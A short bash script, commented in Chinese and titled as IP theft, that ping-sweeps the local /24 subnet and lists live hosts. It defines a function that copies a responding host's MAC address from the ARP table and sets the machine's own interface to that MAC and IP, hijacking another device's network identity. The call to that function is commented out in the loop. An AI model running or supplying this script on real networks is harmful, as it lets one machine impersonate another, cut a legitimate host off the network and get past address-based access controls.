#!/bin/bash


# ip盗用
function set_address()
{
	local final_ip=$1
	ping -c 1 -w 1 $ip >> /dev/null
	local hw_address=`arp $final_ip | sed -n '2p' | awk '{print $3}'`
	echo $hw_address
	#设置ip和mac
	sudo ifconfig $eth_name down
	sudo ifconfig $eth_name hw ether $hw_address
	sudo ifconfig $eth_name up
	sudo ifconfig $eth_name $final_ip
}

echo "正在执行中..."

#获取第一个网卡名称
eth_name=`ifconfig | head -1 | awk '{print $1}'`

#获取第一个网卡的ip地址
my_ip=`ifconfig | grep -w inet | head -1 | awk -F: '{print $2}' | awk '{print $1}'`
net=`echo $my_ip | sed 's/[0-9]\{1,3\}//4'`
ip_num=`echo $my_ip | cut -d. -f 4`


for i in {1..254}
do
	if [ $i -eq $ip_num ];then
		continue
	fi

	ip=${net}${i}
	ping -c 1 -w 1 $ip >> /dev/null

	if [ $? -eq 0 ];then
		# set_address $ip
		# break
		echo $ip
	fi

done
echo 


